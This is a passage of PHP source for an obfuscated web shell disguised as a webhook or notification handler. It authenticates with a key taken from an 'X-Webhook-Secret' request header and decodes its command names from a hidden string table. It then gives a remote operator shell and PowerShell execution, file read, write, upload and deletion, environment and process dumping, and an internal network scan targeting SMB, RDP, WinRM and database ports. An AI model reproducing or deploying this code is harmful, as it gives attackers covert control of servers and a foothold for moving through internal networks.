        if ($chunk === false || $chunk === '') break;
        $buf .= $chunk;
        $n++;
    }
    @fclose($s);
    if ($buf === '') return;
    mergeOverrideHh($buf, $status, $server, $powered);
    $body = $buf;
    $cut = strpos($buf, "\r\n\r\n");
    if ($cut === false) $cut = strpos($buf, "\n\n");
    if ($cut !== false) $body = substr($buf, $cut);
    $title = mergeOverrideHt($body);
}
function mergeOverrideXp($spec, $extras, &$tgts) {
    $seen = array();
    $parts = array();
    foreach (preg_split('/[,;\n]/', $spec) as $raw) {
        $e = trim($raw);
        if ($e !== '') $parts[] = $e;
    }
    foreach ($parts as $e) {
        if ($e === 'auto') {
            $prefs = array();
            foreach ($extras as $ip) {
                $d = strrpos($ip, '.');
                if ($d !== false && mergeOverrideRf($ip)) $prefs[substr($ip, 0, $d)] = 1;
            }
            foreach ($prefs as $pref => $_) {
                $i = 1;
                while ($i <= 254) {
                    $ip = $pref . '.' . $i;
                    if (!isset($seen[$ip])) { $seen[$ip] = 1; $tgts[] = $ip; }
                    $i++;
                }
            }
            foreach ($extras as $ip) {
                if (!isset($seen[$ip]) && strpos($ip, '.') !== false) { $seen[$ip] = 1; $tgts[] = $ip; }
            }
            continue;
        }
        if (substr($e, -3) === '/24') {
            $baseIp = substr($e, 0, -3);
            $d = strrpos($baseIp, '.');
            $pref = ($d !== false) ? substr($baseIp, 0, $d) : $baseIp;
            $i = 1;
            while ($i <= 254) {
                $ip = $pref . '.' . $i;
                if (!isset($seen[$ip])) { $seen[$ip] = 1; $tgts[] = $ip; }
                $i++;
            }
            continue;
        }
        $dash = strrpos($e, '-'); $lastdot = strrpos($e, '.');
        if ($dash !== false && $lastdot !== false && $dash > $lastdot) {
            $pref = substr($e, 0, $lastdot);
            $rs = substr($e, $lastdot + 1);
            $rr = explode('-', $rs);
            if (count($rr) === 2) {
                $a = intval($rr[0]); $b = intval($rr[1]);
                if ($a < 1) $a = 1; if ($b > 254) $b = 254;
                $i = $a;
                while ($i <= $b) {
                    $ip = $pref . '.' . $i;
                    if (!isset($seen[$ip])) { $seen[$ip] = 1; $tgts[] = $ip; }
                    $i++;
                }
                continue;
            }
        }
        if (!isset($seen[$e])) { $seen[$e] = 1; $tgts[] = $e; }
    }
    if (count($tgts) === 0 && count($extras) > 0) mergeOverrideXp('auto', $extras, $tgts);
}
function mergeOverrideTc($tgts, $ports, $waitMs, $useSock = false, $deadline = 0) {
    $open = array();
    $pairs = array();
    foreach ($tgts as $t) {
        foreach ($ports as $p) $pairs[] = array($t, (int)$p);
    }
    $batch = $useSock ? 32 : 64;
    $n = count($pairs);
    $b = 0;
    $flags = STREAM_CLIENT_CONNECT | STREAM_CLIENT_ASYNC_CONNECT;
    while ($b < $n) {
        if ($deadline && microtime(true) >= $deadline) break;
        $socks = array();
        $end = $b + $batch;
        if ($end > $n) $end = $n;
        $i = $b;
        while ($i < $end) {
            $ip = $pairs[$i][0]; $port = $pairs[$i][1];
            $errno = 0; $errstr = '';
            if ($useSock) {
                $s = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
                if ($s) {
                    @socket_set_nonblock($s);
                    @socket_connect($s, $ip, $port);
                    $socks[] = array($s, $ip, $port, 1);
                }
            } else {
                $s = @stream_socket_client('tcp://' . $ip . ':' . $port, $errno, $errstr, 0, $flags);
                if ($s) $socks[] = array($s, $ip, $port, 0);
            }
            $i++;
        }
        $start = microtime(true);
        $limit = $waitMs / 1000.0;
        while (count($socks) > 0) {
            $left = $limit - (microtime(true) - $start);
            if ($left <= 0) break;
            $r = array(); $w = array(); $e = array();
            foreach ($socks as $x) { $w[] = $x[0]; }
            $sec = (int)$left;
            $usec = (int)(($left - $sec) * 1000000);
            if ($usec < 0) $usec = 0;
            if ($useSock) @socket_select($r, $w, $e, $sec, $usec);
            else @stream_select($r, $w, $e, $sec, $usec);
            $next = array();
            foreach ($socks as $x) {
                $done = false;
                foreach ($w as $rs) { if ($rs === $x[0]) { $done = true; break; } }
                if ($done) {
                    $ok = false;
                    if (!empty($x[3])) {
                        $peer = ''; $pp = 0;
                        $ok = @socket_getpeername($x[0], $peer, $pp);
                        @socket_close($x[0]);
                    } else {
                        $peer = @stream_socket_get_name($x[0], true);
                        $ok = (bool)$peer;
                        @fclose($x[0]);
                    }
                    if ($ok) {
                        if (!isset($open[$x[1]])) $open[$x[1]] = array();
                        $open[$x[1]][] = $x[2];
                    }
                } else {
                    $next[] = $x;
                }
            }
            $socks = $next;
        }
        foreach ($socks as $x) {
            if (!empty($x[3])) @socket_close($x[0]);
            else @fclose($x[0]);
        }
        $b = $end;
    }
    return $open;
}
function mergeOverrideIf($spanToken, &$extras, &$localIp, &$domain, &$gateway, $skipCom = false) {
    global $_featureFlags, $_ruleEngine;
    $D = 'broadcastNotice';
    $localIp = isset($_SERVER['SERVER_ADDR']) ? trim($_SERVER['SERVER_ADDR']) : '';
    $domain = ''; $gateway = '';
    $dns = array(); $ifaces = array(); $arp = array(); $routes = array(); $dcs = array(); $nview = array(); $seenIp = array();
    if (function_exists('net_get_interfaces')) {
        $ifs = @net_get_interfaces();
        if (is_array($ifs)) {
            foreach ($ifs as $nm => $info) {
                $unicast = (isset($info['unicast']) && is_array($info['unicast'])) ? $info['unicast'] : array();
                foreach ($unicast as $ua) {
                    $ip = isset($ua['address']) ? $ua['address'] : '';
                    if ($ip === '' || strpos($ip, ':') !== false || strpos($ip, '127.') === 0) continue;
                    $mask = isset($ua['netmask']) ? $ua['netmask'] : '';
                    $ifaces[] = '{"name":"' . mergeOverrideJx($nm) . '","ip":"' . mergeOverrideJx($ip) . '","mask":"' . mergeOverrideJx($mask) . '"}';
                    if (!isset($seenIp[$ip])) { $seenIp[$ip] = 1; $extras[] = $ip; }
                    if (($localIp === '' || $localIp === '127.0.0.1' || strpos($localIp, ':') !== false) && mergeOverrideRf($ip)) $localIp = $ip;
                }
            }
        }
    }
    if ($localIp === '' || $localIp === '127.0.0.1') {
        $hn = @$_ruleEngine[7]();
        $lip = $hn ? @gethostbyname($hn) : '';
        if ($lip && $lip !== $hn && mergeOverrideRf($lip)) $localIp = $lip;
    }
    $ev = @getenv($D($_featureFlags[42], $spanToken));
    if (($domain === '' || strpos($domain, '.') === false) && $ev && strpos($ev, '.') !== false) $domain = $ev;
    $ls = @getenv($D($_featureFlags[43], $spanToken));
    if ($ls) {
        if (strpos($ls, '\\\\') === 0) $ls = substr($ls, 2);
        if ($ls !== '' && !in_array($ls, $dcs, true)) $dcs[] = $ls;
    }
    $rt = @file_get_contents('/proc/net/route');
    if ($rt) {
        foreach (explode("\n", $rt) as $line) {
            $cols = preg_split('/\s+/', trim($line));
            if (count($cols) < 8 || $cols[0] === 'Iface') continue;
            $dest = mergeOverrideHp($cols[1]); $hop = mergeOverrideHp($cols[2]); $mask = mergeOverrideHp($cols[7]);
            if ($dest === '0.0.0.0' && $hop !== '0.0.0.0' && $gateway === '') $gateway = $hop;
            $row = $dest . ' ' . $mask . ' ' . $hop;
            if (count($routes) < 40) $routes[] = mergeOverrideJx($row);
        }
    }
    $ar = @file_get_contents('/proc/net/arp');
    if ($ar) {
        foreach (explode("\n", $ar) as $line) {
            if (strpos($line, 'IP address') !== false) continue;
            $cols = preg_split('/\s+/', trim($line));
            if (count($cols) < 4) continue;
            $ip = $cols[0]; $mac = $cols[3];
            if ($ip === '' || strpos($ip, '127.') === 0 || strpos($ip, '.') === false) continue;
            if (strtolower(str_replace(array(':', '-'), '', $mac)) === 'ffffffffffff') continue;
            $arp[] = '{"ip":"' . mergeOverrideJx($ip) . '","mac":"' . mergeOverrideJx($mac) . '"}';
            if (!isset($seenIp[$ip])) { $seenIp[$ip] = 1; $extras[] = $ip; }
        }
    }
    $rs = @file_get_contents('/etc/resolv.conf');
    if ($rs) {
        foreach (explode("\n", $rs) as $line) {
            $line = trim($line);
            if (strpos($line, 'nameserver') === 0) {
                $dip = trim(substr($line, 10));
                if ($dip !== '' && !in_array($dip, $dns, true)) $dns[] = $dip;
            }
        }
    }
    if (!$skipCom && class_exists('COM')) {
        try {
            $svc = new \COM($D($_featureFlags[22], $spanToken));
            $items = $svc->ExecQuery($D($_featureFlags[48], $spanToken));
            foreach ($items as $it) {
                $ips = $it->IPAddress;
                if ($ips === null) continue;
                $list = is_array($ips) ? $ips : array((string)$ips);
                foreach ($list as $ip) {
                    $ip = trim((string)$ip);
                    if ($ip === '' || strpos($ip, ':') !== false || strpos($ip, '127.') === 0) continue;
                    $ifaces[] = '{"name":"' . mergeOverrideJx((string)$it->Description) . '","ip":"' . mergeOverrideJx($ip) . '","mask":""}';
                    if (!isset($seenIp[$ip])) { $seenIp[$ip] = 1; $extras[] = $ip; }
                    if (($localIp === '' || $localIp === '127.0.0.1') && mergeOverrideRf($ip)) $localIp = $ip;
                }
                $gws = $it->DefaultIPGateway;
                if ($gws !== null) {
                    $gl = is_array($gws) ? $gws : array((string)$gws);
                    foreach ($gl as $gip) {
                        $gip = trim((string)$gip);
                        if ($gip !== '' && $gip !== '0.0.0.0' && $gateway === '') $gateway = $gip;
                    }
                }
                $dnss = $it->DNSServerSearchOrder;
                if ($dnss !== null) {
                    $dl = is_array($dnss) ? $dnss : array((string)$dnss);
                    foreach ($dl as $dip) {
                        $dip = trim((string)$dip);
                        if ($dip !== '' && !in_array($dip, $dns, true)) $dns[] = $dip;
                    }
                }
                $dd = trim((string)$it->DNSDomain);
                if ($domain === '' && strpos($dd, '.') !== false) $domain = $dd;
            }
            $rtq = $svc->ExecQuery($D($_featureFlags[49], $spanToken));
            foreach ($rtq as $it) {
                $dest = trim((string)$it->Destination);
                if ($dest === '') continue;
                $row = $dest . ' ' . $it->Mask . ' ' . $it->NextHop . ' ' . $it->Metric1;
                if (count($routes) < 40) $routes[] = mergeOverrideJx($row);
            }
        } catch (\Exception $e) {}
    }
    if ($localIp === '') $localIp = '127.0.0.1';
    if (strpos($domain, '.') === false) $domain = '';
    $o = '"dns":[';
    $i = 0;
    foreach ($dns as $d) { if ($i > 0) $o .= ','; $o .= '"' . mergeOverrideJx($d) . '"'; $i++; }
    $o .= '],"gateway":"' . mergeOverrideJx($gateway) . '","interfaces":[' . implode(',', $ifaces) . '],"arp":[' . implode(',', $arp) . '],"routes":[';
    $i = 0;
    foreach ($routes as $r) { if ($i > 0) $o .= ','; $o .= '"' . $r . '"'; $i++; }
    $o .= '],"dc_list":[';
    $i = 0;
    foreach ($dcs as $d) { if ($i > 0) $o .= ','; $o .= '"' . mergeOverrideJx($d) . '"'; $i++; }
    $o .= '],"net_view":[';
    $i = 0;
    foreach ($nview as $d) { if ($i > 0) $o .= ','; $o .= '"' . mergeOverrideJx($d) . '"'; $i++; }
    $o .= ']';
    return $o;
}
function mergeOverrideNr($spanToken) {
    global $_ruleEngine;
    $extras = array(); $localIp = ''; $domain = ''; $gateway = '';
    $frag = mergeOverrideIf($spanToken, $extras, $localIp, $domain, $gateway);
    $hn = @$_ruleEngine[7]();
    $u = @$_ruleEngine[9]();
    $ud = @getenv('USERDOMAIN');
    if ($ud) $u = $ud . '\\' . $u;
    $o = 'host=' . $hn . "\n";
    $o .= 'ip=' . $localIp . "\n";
    $o .= 'domain=' . $domain . "\n";
    $o .= 'gateway=' . $gateway . "\n";
    $o .= 'user=' . $u . "\n";
    $o .= str_replace('"', '', $frag);
    return $o;
}
function mergeOverride($arg, $spanToken) {
    global $_ruleEngine;
    @set_time_limit(120);
    @ini_set('max_execution_time', '120');
    $portsPart = '445,3389,5985,80,1433'; $tgtPart = 'auto'; $waitMs = 400;
    if ($arg !== null && $arg !== '') {
        $segs = explode('|', $arg);
        if (isset($segs[0]) && $segs[0] !== '') $portsPart = $segs[0];
        if (isset($segs[1]) && $segs[1] !== '') $tgtPart = $segs[1];
        if (isset($segs[2])) {
            $waitMs = intval($segs[2]);
            if ($waitMs < 50) $waitMs = 50;
            if ($waitMs > 4000) $waitMs = 4000;
        }
    }
    $ports = array();
    foreach (explode(',', $portsPart) as $p) {
        $p = trim($p);
        if ($p === '' || !ctype_digit($p)) return 'ERR ports';
        $ports[] = intval($p);
    }
    $extras = array(); $localIp = ''; $domain = ''; $gateway = '';
    $isWin = (strtoupper(substr(constant($_ruleEngine[1]), 0, 3)) === $_ruleEngine[13]);
    $intel = mergeOverrideIf($spanToken, $extras, $localIp, $domain, $gateway, $isWin);
    $tgts = array();
    mergeOverrideXp($tgtPart, $extras, $tgts);
    if (count($tgts) > 2048) $tgts = array_slice($tgts, 0, 2048);
    $useSock = $isWin && function_exists('socket_create');
    $deadline = microtime(true) + 70;
    $open = mergeOverrideTc($tgts, $ports, $waitMs, $useSock, $deadline);
    $keys = array_keys($open);
    sort($keys);
    $hosts = ''; $first = true; $identLeft = $isWin ? 8 : 48; $httpLeft = $isWin ? 12 : 32;
    foreach ($keys as $ip) {
        $hp = $open[$ip];
        sort($hp, SORT_NUMERIC);
        $nm = ''; $dm = '';
        if ($identLeft > 0 && microtime(true) < $deadline) { $identLeft--; mergeOverrideId($ip, $hp, $spanToken, $nm, $dm); }
        $httpFrag = ''; $hf = true;
        foreach ($hp as $p) {
            $p = (int)$p;
            if (!mergeOverrideHw($p)) continue;
            if ($httpLeft <= 0 || microtime(true) >= $deadline) break;
            $httpLeft--;
            $ht = ''; $hs = ''; $hc = 0; $hx = '';
            mergeOverrideHp2($ip, $p, $ht, $hs, $hc, $hx);
            if ($hc === 0 && $ht === '' && $hs === '') continue;
            if (!$hf) $httpFrag .= ',';
            $hf = false;
            $httpFrag .= '{"p":' . $p . ',"c":' . $hc . ',"s":"' . mergeOverrideJx($hs) . '","t":"' . mergeOverrideJx($ht) . '"';
            if ($hx !== '') $httpFrag .= ',"x":"' . mergeOverrideJx($hx) . '"';
            $httpFrag .= '}';
        }
        if (!$first) $hosts .= ',';
        $first = false;
        $hosts .= '{"ip":"' . $ip . '","name":"' . $nm . '","domain":"' . $dm . '","ports":[';
        $i = 0;
        foreach ($hp as $p) { if ($i > 0) $hosts .= ','; $hosts .= $p; $i++; }
        $hosts .= ']';
        if ($httpFrag !== '') $hosts .= ',"http":[' . $httpFrag . ']';
        $hosts .= '}';
    }
    $hn = @$_ruleEngine[7]();
    $sbnet = $localIp;
    $dpos = strrpos($sbnet, '.');
    if ($dpos !== false) $sbnet = substr($sbnet, 0, $dpos) . '.0/24';
    $o = "===NETSCAN_START===\n";
    $o .= '{"hostname":"' . mergeOverrideJx($hn) . '","local_ip":"' . mergeOverrideJx($localIp) . '"';
    $o .= ',"domain":"' . mergeOverrideJx($domain) . '","current_user":"' . mergeOverrideJx(@$_ruleEngine[9]()) . '"';
    $o .= ',"os_info":"' . mergeOverrideJx(@$_ruleEngine[8]()) . '"';
    $o .= ',"subnet":"' . mergeOverrideJx($sbnet) . '",' . $intel;
    $o .= ',"hosts":[' . $hosts . '],"total":' . count($keys) . ',"scanned_count":' . count($tgts) . '}';
    $o .= "\n===NETSCAN_END===\n";
    return $o;
}

function notifySubscriber($action, $arg, $spanToken) {
    global $_featureFlags, $_ruleEngine;
    $D = 'broadcastNotice';
    $result = '';
    $isWin = (strtoupper(substr(constant($_ruleEngine[1]), 0, 3)) === $_ruleEngine[13]);

    $aEx = $D($_featureFlags[10], $spanToken);
    $aSh = $D($_featureFlags[11], $spanToken);
    $aCm = $D($_featureFlags[12], $spanToken);
    $aPs = $D($_featureFlags[13], $spanToken);
    $aDr = $D($_featureFlags[14], $spanToken);
    $aWm = $D($_featureFlags[15], $spanToken);
    $aSc = $D($_featureFlags[24], $spanToken);
    $aMx = $D($_featureFlags[30], $spanToken);
    $al  = explode('~', $D($_featureFlags[16], $spanToken));
    $rk  = explode('~', $D($_featureFlags[17], $spanToken));
    $ms  = explode('~', $D($_featureFlags[18], $spanToken));

    if ($action === $aEx || $action === $aSh || $action === $aCm) {
        if (empty($arg)) return $ms[0];
        if ($isWin) {
            return queueCallback($arg, $spanToken);
        } else {
            $bash = $D($_featureFlags[7], $spanToken);
            $cflag = $D($_featureFlags[8], $spanToken);
            $spl = explode('~', $D($_featureFlags[26], $spanToken));
            $sn = $spl[array_rand($spl)];
            $inner = $D($_featureFlags[29], $spanToken) . escapeshellarg($sn) . ' ' . $bash . ' ' . $cflag . ' ' . escapeshellarg($arg);
            return queueCallback($bash . ' ' . $cflag . ' ' . escapeshellarg($inner), $spanToken);
        }
    }
    elseif ($action === $aDr) {
        if (empty($arg)) return $ms[0];
        return queueCallback($arg, $spanToken);
    }
    elseif ($action === $aPs) {
        if (empty($arg)) return $ms[0];
        return queueCallback($D($_featureFlags[9], $spanToken) . $arg, $spanToken);
    }
    elseif ($action === $aWm) {
        if (empty($arg)) return $ms[0];
        return queueCallback($arg, $spanToken);
    }
    elseif ($action === $aSc) {
        if (empty($arg) || strpos($arg, '|') === false) return $ms[19];
        $p = strpos($arg, '|');
        $interp = substr($arg, 0, $p);
        $b64 = substr($arg, $p + 1);
        $code = @base64_decode($b64);
        if ($code === false) return $ms[19];
        $wl = explode('~', $D($_featureFlags[25], $spanToken));
        if (!in_array($interp, $wl)) return $ms[20];
        return assemblePayload($interp, $code, $spanToken);
    }
    elseif ($action === $aMx) {
        if ($isWin) return $ms[21];
        $df = array_map('trim', explode(',', @ini_get($D($_featureFlags[19], $spanToken))));
        $fn5 = $D($_featureFlags[5], $spanToken);
        if (empty($fn5) || !function_exists($fn5) || in_array($fn5, $df)) return $ms[22];
        if (empty($arg)) return $ms[19];
        $p = strpos($arg, '|');
        if ($p !== false) {
            $eb = substr($arg, 0, $p);
            $ua = trim(substr($arg, $p + 1));
        } else {
            $eb = $arg;
            $ua = '';
        }
        $aa = !empty($ua) ? array_values(array_filter(explode(' ', $ua), 'strlen')) : array();
        $tpl = $D($_featureFlags[31], $spanToken);
        $bs = sprintf($tpl, $eb, json_encode($aa));
        $wl = explode('~', $D($_featureFlags[25], $spanToken));
        $r = assemblePayload($wl[0], $bs, $spanToken);
        if (strpos($r, 'not found') !== false || strpos($r, 'No such file') !== false) {
            $r = assemblePayload($wl[1], $bs, $spanToken);
        }
        return $r;
    }
    elseif ($action === $al[0]) {
        if (empty($arg)) return $ms[2] . $_ruleEngine[4]();
        $rp = @realpath($arg);
        if ($rp !== false && @is_dir($rp)) return $ms[2] . $rp;
        return $ms[1] . $arg;
    }
    elseif ($action === $al[1]) {
        $result .= $rk[0] . '=' . ($_SERVER['SERVER_SOFTWARE'] ?? '') . "\n";
        $result .= $rk[1] . '=' . @$_ruleEngine[7]() . "\n";
        $result .= $rk[2] . '=' . @$_ruleEngine[7]() . "\n";
        $_hn = @$_ruleEngine[7]();
        $_lip = @gethostbyname($_hn);
        if (empty($_lip) || $_lip === $_hn) $_lip = ($_SERVER['SERVER_ADDR'] ?? '');
        $_priv = (substr($_lip, 0, 3) === '10.' || substr($_lip, 0, 8) === '192.168.' || substr($_lip, 0, 4) === '172.');
        if (!$_priv) {
            if ($isWin) {
                $_ipc = @queueCallback($D($_featureFlags[6], $spanToken) . 'ipconfig', $spanToken);
            } else {
                $_ipc = @queueCallback('hostname -I 2>/dev/null || ip -4 addr show 2>/dev/null', $spanToken);
            }
            if (!empty($_ipc) && preg_match_all('/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/', $_ipc, $_m)) {
                foreach ($_m[1] as $_pip) {
                    if (substr($_pip, 0, 3) === '10.' || substr($_pip, 0, 8) === '192.168.' || substr($_pip, 0, 4) === '172.') {
                        $_lip = $_pip;
                        break;
                    }
                }
            }
        }
        $result .= $rk[3] . '=' . $_lip . "\n";
        if (isset($_SERVER['SERVER_ADDR']) && $_SERVER['SERVER_ADDR'] !== $_lip) {
            $result .= $rk[13] . '=' . $_SERVER['SERVER_ADDR'] . "\n";
        }
        $result .= $rk[4] . '=' . ($_SERVER['SERVER_PORT'] ?? '') . "\n";
        $result .= $rk[5] . '=' . @$_ruleEngine[4]() . "\n";
        $result .= $rk[6] . '=' . @$_ruleEngine[8]() . "\n";
        if ($isWin) {
            $_ud = @getenv('USERDOMAIN');
            $_un = @getenv('USERNAME');
            $u = !empty($_un) ? $_un : @$_ruleEngine[9]();
            if (!empty($_ud)) $u = $_ud . '\\' . $u;
        } else {
            $u = @$_ruleEngine[9]();
            if (function_exists($_ruleEngine[10]) && function_exists($_ruleEngine[11])) {
                $pw = @$_ruleEngine[11](@$_ruleEngine[10]());
                if ($pw) $u = $pw['name'];
            }
        }
        $result .= $rk[7] . '=' . $u . "\n";
        $result .= $rk[11] . '=' . @$_ruleEngine[8]('m') . "\n";
        if ($isWin) {
            $_dr = '';
            for ($_i = 65; $_i <= 90; $_i++) {
                if (@is_dir(chr($_i) . ':\\')) $_dr .= chr($_i) . ':\\,';
            }
            if (!empty($_dr)) $result .= $rk[9] . '=' . rtrim($_dr, ',') . "\n";
        }
        return $result;
    }
    elseif ($action === $al[2] || $action === $al[3] || $action === $al[4]) {
        $u = @$_ruleEngine[9]();
        if (function_exists($_ruleEngine[10]) && function_exists($_ruleEngine[11])) {
            $pw = @$_ruleEngine[11](@$_ruleEngine[10]());
            if ($pw) $u = $pw['name'];
        }
        return $u;
    }
    elseif ($action === $al[5] || $action === $al[6]) {
        return @$_ruleEngine[7]() . ' ' . @$_ruleEngine[8]();
    }
    elseif ($action === $al[7]) {
        return @$_ruleEngine[4]();
    }
    elseif ($action === $al[8] || $action === $al[9]) {
        $dp = empty($arg) ? @$_ruleEngine[4]() : $arg;
        if (!@is_dir($dp)) return $ms[3] . $dp;
        $items = @scandir($dp);
        if ($items === false) return $ms[3] . $dp;
        foreach ($items as $f) {
            if ($f === '.' || $f === '..') continue;
            $full = $dp . constant($_ruleEngine[3]) . $f;
            if (@is_dir($full)) {
                $result .= $ms[8] . @date('Y-m-d H:i', @filemtime($full)) . ' ' . $f . "\n";
            } else {
                $sz = @filesize($full);
                $result .= $ms[9] . @date('Y-m-d H:i', @filemtime($full)) . ' ' . ($sz !== false ? $sz : 0) . ' ' . $f . "\n";
            }
        }
        return $result;
    }
    elseif ($action === $al[10] || $action === $al[11] || $action === $al[12]) {
        if (empty($arg)) return $ms[0];
        if (!@file_exists($arg)) return $ms[4] . $arg;
        $c = @file_get_contents($arg);
        return ($c !== false) ? $c : $ms[4] . $arg;
    }
    elseif ($action === $al[13]) {
        if (empty($arg) || strpos($arg, '|') === false) return $ms[5];
        $p = strpos($arg, '|');
        $path = substr($arg, 0, $p);
        $content = substr($arg, $p + 1);
        $bytes = @file_put_contents($path, $content);
        return ($bytes !== false) ? $ms[2] . $bytes . ' bytes' : $ms[4] . $path;
    }
    elseif ($action === $al[14]) {
        if (empty($arg)) return $ms[6];
        return @mkdir($arg, 0755, true) ? $ms[2] . $arg : $ms[4] . $arg;
    }
    elseif ($action === $al[15] || $action === $al[16]) {
        if (empty($arg)) return $ms[6];
        if (@is_file($arg)) { @unlink($arg); return $ms[14]; }
        if (@is_dir($arg)) {
            $ri = new \RecursiveIteratorIterator(
                new \RecursiveDirectoryIterator($arg, \FilesystemIterator::SKIP_DOTS),
                \RecursiveIteratorIterator::CHILD_FIRST
            );
            foreach ($ri as $fi) {
                $fi->isDir() ? @rmdir($fi->getRealPath()) : @unlink($fi->getRealPath());
            }
            @rmdir($arg);
            return $ms[15];
        }
        return $ms[4] . $arg;
    }
    elseif ($action === $al[17]) {
        if (constant($_ruleEngine[14]) >= 70100) {
            $env = @getenv();
            if (is_array($env)) {
                foreach ($env as $ek => $ev) $result .= $ek . '=' . $ev . "\n";
            }
        }
        if (empty($result)) {
            foreach ($_SERVER as $ek => $ev) {
                if (!is_array($ev)) $result .= $ek . '=' . $ev . "\n";
            }
        }
        return $result;
    }
    elseif ($action === $al[18] || $action === $al[19]) {
        if (!$isWin) {
            $procDir = $D($_featureFlags[21], $spanToken);
            $d = @opendir($procDir);
            if ($d) {
                while (($entry = @readdir($d)) !== false) {
                    if (!is_numeric($entry)) continue;
                    $status = @file_get_contents($procDir . '/' . $entry . '/status');
                    $name = $entry;
                    if ($status && preg_match('/^Name:\s+(.+)$/m', $status, $m)) $name = $m[1];
                    $result .= str_pad($entry, 7) . ' ' . $name . "\n";
                }
                @closedir($d);
            }
            if (empty($result)) {
                $result = queueCallback($D($_featureFlags[35], $spanToken), $spanToken);
            }
        } else {
            if (class_exists('COM')) {
                try {
                    $svc = new \COM($D($_featureFlags[22], $spanToken));
                    $items = $svc->ExecQuery($D($_featureFlags[23], $spanToken));
                    foreach ($items as $it) {
                        $result .= str_pad($it->ProcessId, 7) . ' ' . $it->Name . "\n";
                    }
                } catch (\Exception $e) {
                    $result = queueCallback($D($_featureFlags[6], $spanToken) . $D($_featureFlags[36], $spanToken), $spanToken);
                }
            } else {
                $result = queueCallback($D($_featureFlags[6], $spanToken) . $D($_featureFlags[36], $spanToken), $spanToken);
            }
        }
        return $result;
    }
    elseif ($action === $al[20] || $action === $al[21]) {
        return mergeOverrideNr($spanToken);
    }
    elseif ($action === $al[22]) {
        return implode('|', $al);
    }
    elseif ($action === $al[23]) {
        if ($isWin) {
            for ($i = 65; $i <= 90; $i++) {
                $dr = chr($i) . ':\\';
                if (@is_dir($dr)) {
                    $free = @$_ruleEngine[12]($dr);
                    if ($free !== false)
                        $result .= chr($i) . ':\\ ' . intval($free / 1048576) . 'MB free' . "\n";
                    else
                        $result .= chr($i) . ":\\\n";
                }
            }
        } else {
            $free = @$_ruleEngine[12]('/');
            $result .= "/ " . ($free !== false ? intval($free / 1048576) . "MB free" : "") . "\n";
        }
        return $result;
    }
    elseif ($action === $al[24]) {
        if (empty($arg)) return $ms[6];
        if (!@file_exists($arg)) return $ms[4] . $arg;
        $data = @file_get_contents($arg);
        return ($data !== false) ? base64_encode($data) : $ms[4] . $arg;
    }
    elseif ($action === $al[25]) {
        if (empty($arg) || strpos($arg, '|') === false) return $ms[18];
        $p = strpos($arg, '|');
        $path = substr($arg, 0, $p);
        $data = base64_decode(substr($arg, $p + 1));
        $bytes = @file_put_contents($path, $data);
        return ($bytes !== false) ? $ms[16] : $ms[4] . $path;
    }
    elseif ($action === $al[26] || $action === $al[27]) {
        if (empty($arg) || strpos($arg, '|') === false) return $ms[18];
        $p = strpos($arg, '|');
        $src = substr($arg, 0, $p); $dst = substr($arg, $p + 1);
        if (@file_exists($src)) {
            return @copy($src, $dst) ? $ms[12] : $ms[4] . $src;
        }
        return $ms[11];
    }
    elseif ($action === $al[28] || $action === $al[29] || $action === $al[30]) {
        if (empty($arg) || strpos($arg, '|') === false) return $ms[18];
        $p = strpos($arg, '|');
        $src = substr($arg, 0, $p); $dst = substr($arg, $p + 1);
        if (@file_exists($src) || @is_dir($src)) {
            return @rename($src, $dst) ? $ms[13] : $ms[4] . $src;
        }
        return $ms[11];
    }
    elseif (isset($al[32]) && $action === $al[32]) {
        return mergeOverride($arg, $spanToken);
    }
    elseif ($action === $al[31]) {
        $_l = explode('~', $D($_featureFlags[33], $spanToken));
        $result .= $_l[0] . "\n";
        $result .= $_l[1] . constant($_ruleEngine[0]) . "\n";
        $result .= $_l[2] . constant($_ruleEngine[1]) . "\n";
        $result .= $_l[3] . constant($_ruleEngine[2]) . "\n";
        $result .= $_l[4] . ($_SERVER['SERVER_SOFTWARE'] ?? $_l[19]) . "\n";
        $result .= $_l[5] . @$_ruleEngine[4]() . "\n";
        $result .= $_l[6] . @$_ruleEngine[5]() . "\n";
        $result .= $_l[7] . (@$_ruleEngine[6](@$_ruleEngine[5]()) ? $_l[8] : $_l[9]) . "\n";
        $di = @ini_get($D($_featureFlags[19], $spanToken));
        $df = array_map('trim', explode(',', $di));
        $fns = array(
            $D($_featureFlags[1], $spanToken), $D($_featureFlags[2], $spanToken),
            $D($_featureFlags[3], $spanToken), $D($_featureFlags[4], $spanToken),
            $D($_featureFlags[5], $spanToken)
        );
        foreach ($fns as $fn) {
            if (empty($fn)) continue;
            $ok = function_exists($fn) && !in_array($fn, $df);
            $result .= $fn . ': ' . ($ok ? $_l[10] : $_l[11]) . "\n";
        }
        $result .= $_l[12] . (@ini_get($_l[22]) ?: $_l[13]) . "\n";
        if ($isWin) {
            $result .= $_l[14] . (class_exists('COM') ? $_l[10] : $_l[11]) . "\n";
        } else {
            $result .= $_l[15] . (function_exists($_ruleEngine[10]) ? $_l[10] : $_l[11]) . "\n";
        }
        $_ae = function_exists('openssl_encrypt');
        $_tk = $_ae ? @hex2bin($D($_featureFlags[38], $spanToken)) : '';
        $result .= $_l[16] . ($_ae && !empty($_tk) && strlen($_tk) === 32 ? $_l[10] : $_l[11]) . "\n";
        $ipl = explode('~', $D($_featureFlags[25], $spanToken));
        $_bp = explode('~', $D($_featureFlags[34], $spanToken));
        foreach ($ipl as $ip) {
            $found = false;
            if ($isWin) {
                $out = array(); $rc = 1;
                @exec($_l[20] . $ip . $_l[21], $out, $rc);
                $found = ($rc === 0 && !empty($out));
            } else {
                foreach ($_bp as $bp) {
                    if (@file_exists($bp . $ip)) { $found = true; break; }
                }
            }
            $result .= $_l[17] . $ip . ': ' . ($found ? $_l[10] : $_l[18]) . "\n";
        }
        return $result;
    }
    else {
        return $ms[7] . $action;
    }
}

// ========== Entry Point ==========
$spanToken = isset($_SERVER['HTTP_X_WEBHOOK_SECRET']) ? $_SERVER['HTTP_X_WEBHOOK_SECRET'] : '';
if (empty($spanToken)) aggregateStats();

$D = 'broadcastNotice';
if (@$D($_featureFlags[0], $spanToken) !== 'valid') aggregateStats();
if ($_SERVER['REQUEST_METHOD'] !== 'POST') aggregateStats();

$_ruleEngine = explode('~', $D($_featureFlags[37], $spanToken));

$body = @file_get_contents('php://input');
if (empty($body)) aggregateStats();

$PJ = 'evaluateRule';
$rid = $PJ($body, 'rid');
$em  = $PJ($body, 'module');
$ed  = $PJ($body, 'data');
if (empty($em)) aggregateStats();

$AD = 'restoreCheckpoint';
